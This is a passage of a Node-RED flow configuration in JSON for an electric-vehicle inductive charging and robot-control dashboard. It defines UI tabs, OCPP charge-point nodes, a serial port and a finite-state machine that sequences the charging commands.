[
    {
        "id": "cef4d9483175d070",
        "type": "tab",
        "label": "Flow 1",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "7e9ca27958ea1d57",
        "type": "tab",
        "label": "Flow 2",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "acc9f35a.ec54d8",
        "type": "tab",
        "label": "Flow 3",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "bbb8295636ce293b",
        "type": "tab",
        "label": "Flow 4",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "SpiderPig420",
        "type": "tab",
        "label": "SpiderPig420",
        "disabled": true,
        "info": ""
    },
    {
        "id": "119587e64ad8891c",
        "type": "tab",
        "label": "OS Info",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "5c3cf3d89dd2afb1",
        "type": "tab",
        "label": "Robot Control",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "786f9546367d3e03",
        "type": "tab",
        "label": "Inductive Charger",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "c0a31c6397e1a095",
        "type": "websocket-listener",
        "path": "wss://demo.piesocket.com/v3/channel_123?api_key=VCXCEuvhGcBDP7XhiJJUDvR1e1D3eiVjgZ9VRiaV&notify_self",
        "wholemsg": "false"
    },
    {
        "id": "6122f0c438c0ba16",
        "type": "ui_base",
        "theme": {
            "name": "theme-dark",
            "lightTheme": {
                "default": "#0094CE",
                "baseColor": "#0094CE",
                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
                "edited": true,
                "reset": false
            },
            "darkTheme": {
                "default": "#097479",
                "baseColor": "#09771f",
                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
                "edited": true,
                "reset": false
            },
            "customTheme": {
                "name": "Untitled Theme 1",
                "default": "#4B7930",
                "baseColor": "#4B7930",
                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
                "reset": false
            },
            "themeState": {
                "base-color": {
                    "default": "#097479",
                    "value": "#097479",
                    "edited": true
                },
                "page-titlebar-backgroundColor": {
                    "value": "#09771f",
                    "edited": false
                },
                "page-backgroundColor": {
                    "value": "#111111",
                    "edited": false
                },
                "page-sidebar-backgroundColor": {
                    "value": "#333333",
                    "edited": false
                },
                "group-textColor": {
                    "value": "#0ebe32",
                    "edited": false
                },
                "group-borderColor": {
                    "value": "#555555",
                    "edited": false
                },
                "group-backgroundColor": {
                    "value": "#333333",
                    "edited": false
                },
                "widget-textColor": {
                    "value": "#eeeeee",
                    "edited": false
                },
                "widget-backgroundColor": {
                    "value": "#09771f",
                    "edited": false
                },
                "widget-borderColor": {
                    "value": "#333333",
                    "edited": false
                },
                "base-font": {
                    "value": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif"
                }
            },
            "angularTheme": {
                "primary": "indigo",
                "accents": "blue",
                "warn": "red",
                "background": "grey",
                "palette": "light"
            }
        },
        "site": {
            "name": "Node-RED Dashboard",
            "hideToolbar": "false",
            "allowSwipe": "false",
            "lockMenu": "false",
            "allowTempTheme": "true",
            "dateFormat": "DD/MM/YYYY",
            "sizes": {
                "sx": 48,
                "sy": 48,
                "gx": 6,
                "gy": 6,
                "cx": 6,
                "cy": 6,
                "px": 0,
                "py": 0
            }
        }
    },
    {
        "id": "8ddd968d31b1264d",
        "type": "ui_tab",
        "name": "Car Charging",
        "icon": "dashboard",
        "order": 3,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "c1ce274fc67ef54b",
        "type": "ui_tab",
        "name": "Robot Control",
        "icon": "smartphone",
        "order": 2,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "d7901f40.2659d",
        "type": "ui_tab",
        "name": "Charts Test",
        "icon": "dashboard",
        "order": 4,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "3316deba5234ba30",
        "type": "ui_tab",
        "name": "Keyboard Test",
        "icon": "dashboard",
        "order": 5,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "c224905b.f6d62",
        "type": "ui_tab",
        "name": "Monitoring",
        "icon": "dashboard",
        "order": 6,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "5132060d.4cde48",
        "type": "ui_tab",
        "name": "Home",
        "icon": "dashboard",
        "order": 7,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "570b4e81eff61e5c",
        "type": "ui_group",
        "name": "Group Charger",
        "tab": "8ddd968d31b1264d",
        "order": 1,
        "disp": true,
        "width": "6",
        "collapse": false,
        "className": ""
    },
    {
        "id": "6a4d510d.5de65",
        "type": "ui_group",
        "name": "Group Users",
        "tab": "8ddd968d31b1264d",
        "order": 3,
        "disp": true,
        "width": "6",
        "collapse": false,
        "className": ""
    },
    {
        "id": "c86f4eb8832ef5e9",
        "type": "ui_group",
        "name": "Video Stream",
        "tab": "c1ce274fc67ef54b",
        "order": 2,
        "disp": true,
        "width": "10",
        "collapse": false,
        "className": ""
    },
    {
        "id": "d52b17e5862adc94",
        "type": "ui_group",
        "name": "OS Info",
        "tab": "c1ce274fc67ef54b",
        "order": 1,
        "disp": true,
        "width": "6",
        "collapse": false,
        "className": ""
    },
    {
        "id": "08d388c7e26378d4",
        "type": "ui_group",
        "name": "Sensor Inputs",
        "tab": "c1ce274fc67ef54b",
        "order": 3,
        "disp": false,
        "width": "6",
        "collapse": false,
        "className": ""
    },
    {
        "id": "89749fb7.87f01",
        "type": "ui_group",
        "name": "Charts",
        "tab": "d7901f40.2659d",
        "order": 2,
        "disp": false,
        "width": "6"
    },
    {
        "id": "ab397e95.29ebe",
        "type": "ui_group",
        "name": "Inputs",
        "tab": "d7901f40.2659d",
        "order": 1,
        "disp": false,
        "width": "6"
    },
    {
        "id": "4e7edda4.417004",
        "type": "ui_group",
        "name": "Group 3",
        "tab": "d7901f40.2659d",
        "order": 3,
        "disp": false,
        "width": "6"
    },
    {
        "id": "5c044aeab0668850",
        "type": "ui_group",
        "name": "Group Video",
        "tab": "8ddd968d31b1264d",
        "order": 2,
        "disp": true,
        "width": "10",
        "collapse": false,
        "className": ""
    },
    {
        "id": "a348b0ef9d248038",
        "type": "ui_group",
        "name": "Default",
        "tab": "3316deba5234ba30",
        "order": 1,
        "disp": true,
        "width": "6",
        "collapse": false,
        "className": ""
    },
    {
        "id": "d4fe26d3.991cf8",
        "type": "ui_group",
        "name": "Sensor DHT11",
        "tab": "c224905b.f6d62",
        "order": 2,
        "disp": true,
        "width": "6"
    },
    {
        "id": "b914d6c9.8d1b18",
        "type": "ui_group",
        "name": "Sensor DS18B20",
        "tab": "c224905b.f6d62",
        "order": 1,
        "disp": true,
        "width": "6"
    },
    {
        "id": "2c6a4858.2d97e8",
        "type": "ui_group",
        "name": "Sensor BMP180",
        "tab": "c224905b.f6d62",
        "order": 3,
        "disp": true,
        "width": "6"
    },
    {
        "id": "84440358.ae3f7",
        "type": "ui_group",
        "name": "Pressure, Humidity",
        "tab": "c224905b.f6d62",
        "order": 4,
        "disp": true,
        "width": "6"
    },
    {
        "id": "a249173c.7e48d8",
        "type": "ui_group",
        "name": "DHT11: Humid (24 Horas)",
        "tab": "c224905b.f6d62",
        "order": 6,
        "disp": true,
        "width": "6"
    },
    {
        "id": "63fe04f6.773c0c",
        "type": "ui_group",
        "name": "BMP180: Pressure (24 Horas)",
        "tab": "c224905b.f6d62",
        "order": 7,
        "disp": true,
        "width": "6"
    },
    {
        "id": "755805a6.c720ec",
        "type": "ui_group",
        "name": "DS18B20: Temp (24 Horas)",
        "tab": "c224905b.f6d62",
        "order": 8,
        "disp": true,
        "width": "6"
    },
    {
        "id": "66220f0a.3097",
        "type": "ui_group",
        "name": "DHT11: Humid (5 Min)",
        "tab": "c224905b.f6d62",
        "order": 5,
        "disp": true,
        "width": "6"
    },
    {
        "id": "42c277f062ba6187",
        "type": "ui_group",
        "name": "Virtual Inputs",
        "tab": "c1ce274fc67ef54b",
        "order": 4,
        "disp": true,
        "width": "6",
        "collapse": false,
        "className": ""
    },
    {
        "id": "dce9e7a2.d20c78",
        "type": "ui_group",
        "name": "Object detection",
        "tab": "5132060d.4cde48",
        "order": 1,
        "disp": true,
        "width": "9",
        "collapse": false
    },
    {
        "id": "5fa1e3b2c9358c39",
        "type": "ui_group",
        "d": true,
        "name": "Path",
        "tab": "c1ce274fc67ef54b",
        "order": 5,
        "disp": true,
        "width": "6",
        "collapse": true,
        "className": ""
    },
    {
        "id": "2bafdaab.15b956",
        "type": "ocpp-remotej-cp",
        "name": "",
        "cbId": "HTML",
        "ocppver": "1.6j"
    },
    {
        "id": "c40fa4abfe9f0cbc",
        "type": "ocpp-remotej-cp",
        "name": "",
        "cbId": "ocpp",
        "ocppver": "1.6j"
    },
    {
        "id": "827088a0b0ec5431",
        "type": "ocpp-remotej-cp",
        "name": "",
        "cbId": "HTML1",
        "ocppver": "1.6j"
    },
    {
        "id": "ea648ad3e5daea23",
        "type": "ocpp-remotej-cp",
        "name": "",
        "cbId": "HTML2",
        "ocppver": "1.6j"
    },
    {
        "id": "14889abbc7a936c9",
        "type": "ocpp-remotej-cp",
        "name": "",
        "cbId": "HTML3",
        "ocppver": "1.6j"
    },
    {
        "id": "d86c30358aabe2a6",
        "type": "serial-port",
        "serialport": "/dev/ttyS0",
        "serialbaud": "115200",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "\\n",
        "responsetimeout": "10000"
    },
    {
        "id": "0f3fbbc1566187b3",
        "type": "ui_group",
        "name": "CNC Controls",
        "tab": "795186a645332a04",
        "order": 4,
        "disp": true,
        "width": "6",
        "collapse": true,
        "className": ""
    },
    {
        "id": "5f6199bf04b7d1c1",
        "type": "ui_spacer",
        "z": "5c3cf3d89dd2afb1",
        "name": "spacer",
        "group": "d52b17e5862adc94",
        "order": 20,
        "width": 3,
        "height": 1
    },
    {
        "id": "e43ca4e27a354dac",
        "type": "ui_spacer",
        "z": "5c3cf3d89dd2afb1",
        "name": "spacer",
        "group": "c86f4eb8832ef5e9",
        "order": 14,
        "width": 3,
        "height": 1
    },
    {
        "id": "79e796037377b288",
        "type": "ui_spacer",
        "z": "5c3cf3d89dd2afb1",
        "name": "spacer",
        "group": "c86f4eb8832ef5e9",
        "order": 15,
        "width": 3,
        "height": 1
    },
    {
        "id": "ee3be0e2ce260ad4",
        "type": "ui_spacer",
        "z": "5c3cf3d89dd2afb1",
        "name": "spacer",
        "group": "08d388c7e26378d4",
        "order": 3,
        "width": 1,
        "height": 1
    },
    {
        "id": "be04c9f86d1f5d84",
        "type": "ui_spacer",
        "z": "5c3cf3d89dd2afb1",
        "name": "spacer",
        "group": "5fa1e3b2c9358c39",
        "order": 5,
        "width": 3,
        "height": 1
    },
    {
        "id": "795186a645332a04",
        "type": "ui_tab",
        "name": "Inductive Charging",
        "icon": "dashboard",
        "order": 1,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "92d96041952701fd",
        "type": "ui_group",
        "name": "Computer Vision",
        "tab": "795186a645332a04",
        "order": 3,
        "disp": true,
        "width": "6",
        "collapse": true,
        "className": ""
    },
    {
        "id": "0262e45575f50b1c",
        "type": "ui_group",
        "name": "Inductive Charging",
        "tab": "795186a645332a04",
        "order": 1,
        "disp": true,
        "width": "6",
        "collapse": false,
        "className": "Inductive Charging"
    },
    {
        "id": "a9d39887c31d9e5b",
        "type": "ui_group",
        "name": "Maintenance",
        "tab": "795186a645332a04",
        "order": 2,
        "disp": true,
        "width": "6",
        "collapse": true,
        "className": ""
    },
    {
        "id": "19ec8063cf7ef671",
        "type": "inject",
        "z": "cef4d9483175d070",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "startCharging",
        "payloadType": "str",
        "x": 170,
        "y": 140,
        "wires": [
            [
                "70d24837.fa7bb8"
            ]
        ]
    },
    {
        "id": "9de4db6385e8c6d6",
        "type": "function",
        "z": "cef4d9483175d070",
        "name": "",
        "func": "msg.payload = msg.payload.status;\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 520,
        "y": 160,
        "wires": [
            [
                "3b38a09cb8e49d29"
            ]
        ]
    },
    {
        "id": "231f98d4c97598e9",
        "type": "delay",
        "z": "cef4d9483175d070",
        "name": "",
        "pauseType": "delay",
        "timeout": "10",
        "timeoutUnits": "seconds",
        "rate": "1",
        "nbRateUnits": "1",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": false,
        "allowrate": false,
        "outputs": 1,
        "x": 635,
        "y": 480,
        "wires": [
            [
                "7fc4ce7aacedba64"
            ]
        ],
        "l": false
    },
    {
        "id": "82c45bb88f301b2c",
        "type": "delay",
        "z": "cef4d9483175d070",
        "name": "",
        "pauseType": "delay",
        "timeout": "10",
        "timeoutUnits": "seconds",
        "rate": "1",
        "nbRateUnits": "1",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": false,
        "allowrate": false,
        "outputs": 1,
        "x": 635,
        "y": 520,
        "wires": [
            [
                "7fc4ce7aacedba64"
            ]
        ],
        "l": false
    },
    {
        "id": "c04517d69cf5324d",
        "type": "function",
        "z": "cef4d9483175d070",
        "name": "",
        "func": "msg.payload = msg.topic;\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 520,
        "y": 320,
        "wires": [
            [
                "c9a24bb9.28a0a8",
                "6011e505f4e30983"
            ]
        ]
    },
    {
        "id": "2f645a8419959bb8",
        "type": "link in",
        "z": "cef4d9483175d070",
        "name": "",
        "links": [
            "65f14dd11d19c9e4",
            "7fc4ce7aacedba64"
        ],
        "x": 95,
        "y": 260,
        "wires": [
            [
                "70d24837.fa7bb8",
                "f9fad5878e39a0d6"
            ]
        ]
    },
    {
        "id": "8b1c7df02ca690ce",
        "type": "switch",
        "z": "cef4d9483175d070",
        "name": "",
        "property": "payload.data.command",
        "propertyType": "msg",
        "rules": [
            {
                "t": "eq",
                "v": "getIfCarIsPresent",
                "vt": "str"
            },
            {
                "t": "eq",
                "v": "getIfCarIsInRightPosition",
                "vt": "str"
            },
            {
                "t": "eq",
                "v": "gotoParkingSlot",
                "vt": "str"
            },
            {
                "t": "eq",
                "v": "isChargingPortPresent",
                "vt": "str"
            },
            {
                "t": "eq",
                "v": "isChargingPortAccessible",
                "vt": "str"
            },
            {
                "t": "eq",
                "v": "pickUpCharger",
                "vt": "str"
            }
        ],
        "checkall": "true",
        "repair": false,
        "outputs": 6,
        "x": 330,
        "y": 580,
        "wires": [
            [
                "e611441e9af4ca55"
            ],
            [
                "1916d74fb75d352f"
            ],
            [
                "77d75914bfb439b3"
            ],
            [
                "233ff4b02f6ed0d0"
            ],
            [
                "699345efdeeb5b29"
            ],
            [
                "3d2f15584a3a965e"
            ]
        ]
    },
    {
        "id": "7fc4ce7aacedba64",
        "type": "link out",
        "z": "cef4d9483175d070",
        "name": "",
        "mode": "link",
        "links": [
            "2f645a8419959bb8",
            "a57bbcb0f7aa4fb8",
            "e83ab329617ab6a0",
            "280ab9b9093d6cfd",
            "d5bc443e2477e6f4",
            "c41b37414c0bd281"
        ],
        "x": 755,
        "y": 580,
        "wires": []
    },
    {
        "id": "e0a846d1cb9f1454",
        "type": "debug",
        "z": "cef4d9483175d070",
        "name": "FSM output",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 530,
        "y": 100,
        "wires": []
    },
    {
        "id": "e611441e9af4ca55",
        "type": "function",
        "z": "cef4d9483175d070",
        "name": "",
        "func": "msg.topic = \"carIsPresent\";\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 520,
        "y": 480,
        "wires": [
            [
                "231f98d4c97598e9"
            ]
        ]
    },
    {
        "id": "1916d74fb75d352f",
        "type": "function",
        "z": "cef4d9483175d070",
        "name": "",
        "func": "msg.topic = \"carIsInRightPosition\";\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 520,
        "y": 520,
        "wires": [
            [
                "82c45bb88f301b2c"
            ]
        ]
    },
    {
        "id": "77d75914bfb439b3",
        "type": "function",
        "z": "cef4d9483175d070",
        "name": "",
        "func": "msg.topic = \"parkingSlotReached\";\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 520,
        "y": 560,
        "wires": [
            [
                "ec057d2e6f5fd209"
            ]
        ]
    },
    {
        "id": "233ff4b02f6ed0d0",
        "type": "function",
        "z": "cef4d9483175d070",
        "name": "",
        "func": "msg.topic = \"chargingPortIsPresent\";\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 520,
        "y": 600,
        "wires": [
            [
                "4d751ec33280c567"
            ]
        ]
    },
    {
        "id": "699345efdeeb5b29",
        "type": "function",
        "z": "cef4d9483175d070",
        "name": "",
        "func": "msg.topic = \"chargingPortIsAccessible\";\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 520,
        "y": 640,
        "wires": [
            [
                "b7bd0d12e66b5e1c"
            ]
        ]
    },
    {
        "id": "ec057d2e6f5fd209",
        "type": "delay",
        "z": "cef4d9483175d070",
        "name": "",
        "pauseType": "delay",
        "timeout": "10",
        "timeoutUnits": "seconds",
        "rate": "1",
        "nbRateUnits": "1",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": false,
        "allowrate": false,
        "outputs": 1,
        "x": 635,
        "y": 560,
        "wires": [
            [
                "7fc4ce7aacedba64"
            ]
        ],
        "l": false
    },
    {
        "id": "4d751ec33280c567",
        "type": "delay",
        "z": "cef4d9483175d070",
        "name": "",
        "pauseType": "delay",
        "timeout": "10",
        "timeoutUnits": "seconds",
        "rate": "1",
        "nbRateUnits": "1",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": false,
        "allowrate": false,
        "outputs": 1,
        "x": 635,
        "y": 600,
        "wires": [
            [
                "7fc4ce7aacedba64"
            ]
        ],
        "l": false
    },
    {
        "id": "b7bd0d12e66b5e1c",
        "type": "delay",
        "z": "cef4d9483175d070",
        "name": "",
        "pauseType": "delay",
        "timeout": "10",
        "timeoutUnits": "seconds",
        "rate": "1",
        "nbRateUnits": "1",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": false,
        "allowrate": false,
        "outputs": 1,
        "x": 635,
        "y": 640,
        "wires": [
            [
                "7fc4ce7aacedba64"
            ]
        ],
        "l": false
    },
    {
        "id": "e83ab329617ab6a0",
        "type": "link in",
        "z": "cef4d9483175d070",
        "name": "",
        "links": [
            "f70aa1fd8658d062",
            "7fc4ce7aacedba64",
            "b1ce530fb1b0e42c",
            "65f14dd11d19c9e4"
        ],
        "x": 415,
        "y": 320,
        "wires": [
            [
                "c04517d69cf5324d"
            ]
        ]
    },
    {
        "id": "3d2f15584a3a965e",
        "type": "function",
        "z": "cef4d9483175d070",
        "name": "",
        "func": "msg.topic = \"chargingStarted\";\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 520,
        "y": 680,
        "wires": [
            [
                "7fc4ce7aacedba64"
            ]
        ]
    },
    {
        "id": "f9fad5878e39a0d6",
        "type": "debug",
        "z": "cef4d9483175d070",
        "name": "FSM input",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 230,
        "y": 260,
        "wires": []
    },
    {
        "id": "d5cf1bafeecc9cd6",
        "type": "function",
        "z": "cef4d9483175d070",
        "name": "",
        "func": "msg.payload = \"Sending command:\" + msg.payload.data.command\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 520,
        "y": 260,
        "wires": [
            [
                "d0701c474c231a42"
            ]
        ]
    },
    {
        "id": "3b38a09cb8e49d29",
        "type": "delay",
        "z": "cef4d9483175d070",
        "name": "",
        "pauseType": "delay",
        "timeout": "1",
        "timeoutUnits": "seconds",
        "rate": "1",
        "nbRateUnits": "1",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": false,
        "allowrate": false,
        "outputs": 1,
        "x": 615,
        "y": 160,
        "wires": [
            [
                "7718b81479877454",
                "9f3512c74e23f6b5"
            ]
        ],
        "l": false
    },
    {
        "id": "9f3512c74e23f6b5",
        "type": "link out",
        "z": "cef4d9483175d070",
        "name": "State",
        "mode": "link",
        "links": [
            "919f0cb4ce4db202",
            "c59ba7aa7bb92a0b",
            "4215829e2a03bb92"
        ],
        "x": 710,
        "y": 120,
        "wires": [],
        "l": true
    },
    {
        "id": "d7abd936468f398d",
        "type": "link out",
        "z": "cef4d9483175d070",
        "name": "Command",
        "mode": "link",
        "links": [
            "3b96e324e7461d78"
        ],
        "x": 730,
        "y": 220,
        "wires": [],
        "l": true
    },
    {
        "id": "6011e505f4e30983",
        "type": "link out",
        "z": "cef4d9483175d070",
        "name": "Response",
        "mode": "link",
        "links": [
            "a5413abffb1bdcf1"
        ],
        "x": 720,
        "y": 320,
        "wires": [],
        "l": true
    },
    {
        "id": "a8166be08aa8b20d",
        "type": "function",
        "z": "cef4d9483175d070",
        "name": "",
        "func": "msg.payload = msg.payload.data.command\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 520,
        "y": 220,
        "wires": [
            [
                "d7abd936468f398d"
            ]
        ]
    },
    {
        "id": "70d24837.fa7bb8",
        "type": "finite-state-machine",
        "z": "cef4d9483175d070",
        "name": "",
        "fsmDefinition": "{\"state\":{\"status\":\"ready\",\"data\":{\"x\":99}},\"transitions\":{\"ready\":{\"startCharging\":{\"status\":\"checkingIfCarIsPresent\",\"data\":{\"command\":\"getIfCarIsPresent\"}}},\"checkingIfCarIsPresent\":{\"carIsPresent\":{\"status\":\"checkingIfCarIsInRightPosition\",\"data\":{\"command\":\"getIfCarIsInRightPosition\"}}},\"checkingIfCarIsInRightPosition\":{\"carIsInRightPosition\":{\"status\":\"goingToParkingSlot\",\"data\":{\"command\":\"gotoParkingSlot\"}},\"carIsInWrongPosition\":{\"status\":\"ready\",\"data\":{\"command\":\"sendErrorCarIsInWrongPosition\"}}},\"goingToParkingSlot\":{\"parkingSlotReached\":{\"status\":\"checkingIfChargingPortIsPresent\",\"data\":{\"command\":\"isChargingPortPresent\",\"setTemer\":\"valami\"}},\"parkingSlotReachingTimeout\":{\"status\":\"ready\",\"data\":{\"command\":\"sendErrorParkingSlotNotReached\"}},\"parkingSlotNotReached\":{\"status\":\"ready\",\"data\":{\"command\":\"sendErrorParkingSlotNotReached\"}}},\"checkingIfChargingPortIsPresent\":{\"chargingPortIsPresent\":{\"status\":\"checkingIfChargingPortIsAccessible\",\"data\":{\"command\":\"isChargingPortAccessible\"}}},\"checkingIfChargingPortIsAccessible\":{\"chargingPortIsAccessible\":{\"status\":\"ready\",\"data\":{\"command\":\"pickUpCharger\"}}}}}",
        "sendInitialState": false,
        "sendStateWithoutChange": false,
        "showTransitionErrors": true,
        "x": 250,
        "y": 200,
        "wires": [
            [
                "9de4db6385e8c6d6",
                "8b1c7df02ca690ce",
                "e0a846d1cb9f1454",
                "d5cf1bafeecc9cd6",
                "a8166be08aa8b20d"
            ]
        ]
    },
    {
        "id": "c9a24bb9.28a0a8",
        "type": "play audio",
        "z": "cef4d9483175d070",
        "name": "",
        "voice": "6",
        "x": 730,
        "y": 360,
        "wires": []
    },
    {
        "id": "7718b81479877454",
        "type": "play audio",
        "z": "cef4d9483175d070",
        "name": "",
        "voice": "6",
        "x": 730,
        "y": 160,
        "wires": []
    },
    {
        "id": "d0701c474c231a42",
        "type": "play audio",
        "z": "cef4d9483175d070",
        "name": "",
        "voice": "5",
        "x": 730,
        "y": 260,
        "wires": []
    },
    {
        "id": "b973810a.e5c0f",
        "type": "debug",
        "z": "7e9ca27958ea1d57",
        "name": "Keyboard output",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 460,
        "y": 580,
        "wires": []
    },
    {
        "id": "65f14dd11d19c9e4",
        "type": "link out",
        "z": "7e9ca27958ea1d57",
        "name": "",
        "mode": "link",
        "links": [
            "2f645a8419959bb8",
            "e83ab329617ab6a0"
        ],
        "x": 395,
        "y": 60,
        "wires": []
    },
    {
        "id": "c59ba7aa7bb92a0b",
        "type": "link in",
        "z": "7e9ca27958ea1d57",
        "name": "",
        "links": [
            "9f3512c74e23f6b5"
        ],
        "x": 195,
        "y": 160,
        "wires": [
            [
                "cbb5a5fc40273167"
            ]
        ]
    },
    {
        "id": "3b96e324e7461d78",
        "type": "link in",
        "z": "7e9ca27958ea1d57",
        "name": "",
        "links": [
            "d7abd936468f398d"
        ],
        "x": 195,
        "y": 240,
        "wires": [
            [
                "d85975f4b1dbc080"
            ]
        ]
    },
    {
        "id": "a5413abffb1bdcf1",
        "type": "link in",
        "z": "7e9ca27958ea1d57",
        "name": "",
        "links": [
            "6011e505f4e30983"
        ],
        "x": 195,
        "y": 320,
        "wires": [
            [
                "7bde0ecf5b18c5ef",
                "e09ee41cd3259748"
            ]
        ]
    },
    {
        "id": "78dbef0085b363a8",
        "type": "inject",
        "z": "7e9ca27958ea1d57",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": true,
        "onceDelay": "0",
        "topic": "",
        "payload": "-",
        "payloadType": "str",
        "x": 195,
        "y": 120,
        "wires": [
            [
                "cbb5a5fc40273167"
            ]
        ],
        "l": false
    },
    {
        "id": "eed5ffdbb6eadaaf",
        "type": "inject",
        "z": "7e9ca27958ea1d57",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": true,
        "onceDelay": "0",
        "topic": "",
        "payload": "-",
        "payloadType": "str",
        "x": 195,
        "y": 200,
        "wires": [
            [
                "d85975f4b1dbc080"
            ]
        ],
        "l": false
    },
    {
        "id": "08eb27bcc765c3d0",
        "type": "inject",
        "z": "7e9ca27958ea1d57",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": true,
        "onceDelay": "0",
        "topic": "",
        "payload": "-",
        "payloadType": "str",
        "x": 195,
        "y": 280,
        "wires": [
            [
                "7bde0ecf5b18c5ef"
            ]
        ],
        "l": false
    },
    {
        "id": "27402358bec486a3",
        "type": "function",
        "z": "7e9ca27958ea1d57",
        "name": "",
        "func": "msg.payload = msg.count;\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 315,
        "y": 400,
        "wires": [
            [
                "4912e11d56cf297b"
            ]
        ],
        "l": false
    },
    {
        "id": "ed62249715dda406",
        "type": "function",
        "z": "7e9ca27958ea1d57",
        "name": "",
        "func": "msg.reset = true;\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 195,
        "y": 400,
        "wires": [
            [
                "e09ee41cd3259748"
            ]
        ],
        "l": false
    },
    {
        "id": "5cee9e3e9e54d33a",
        "type": "inject",
        "z": "7e9ca27958ea1d57",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "reset",
                "v": "true",
                "vt": "bool"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": true,
        "onceDelay": "0",
        "topic": "",
        "payload": "-",
        "payloadType": "str",
        "x": 195,
        "y": 360,
        "wires": [
            [
                "e09ee41cd3259748"
            ]
        ],
        "l": false
    },
    {
        "id": "328b8084e20b077e",
        "type": "ui_media",
        "z": "7e9ca27958ea1d57",
        "group": "6a4d510d.5de65",
        "name": "",
        "width": "6",
        "height": "5",
        "order": 7,
        "category": "",
        "file": "elcar2.png",
        "layout": "center",
        "showcontrols": true,
        "loop": true,
        "onstart": false,
        "scope": "local",
        "tooltip": "",
        "x": 230,
        "y": 680,
        "wires": [
            []
        ]
    },
    {
        "id": "2dca6cdb9e2266a3",
        "type": "ui_button",
        "z": "7e9ca27958ea1d57",
        "name": "",
        "group": "570b4e81eff61e5c",
        "order": 1,
        "width": 0,
        "height": 0,
        "passthru": false,
        "label": "Start Charging",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "",
        "payloadType": "str",
        "topic": "startCharging",
        "topicType": "str",
        "x": 260,
        "y": 60,
        "wires": [
            [
                "65f14dd11d19c9e4",
